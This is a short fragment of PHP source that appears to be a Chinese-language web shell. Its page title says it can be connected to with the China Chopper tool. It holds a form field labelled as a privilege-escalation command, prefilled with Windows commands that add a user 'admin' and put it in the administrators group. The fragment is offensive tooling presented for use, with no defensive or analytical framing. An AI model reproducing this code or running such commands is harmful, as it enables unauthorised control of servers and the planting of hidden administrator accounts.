...
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user admin admin /add & net localgroup administrators admin /add" style="width:600px"><br>
...
print<<<END
<html>
	<title>关注网络 - 关注安全 - 低调隐身 - 菜刀也可连接 </title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
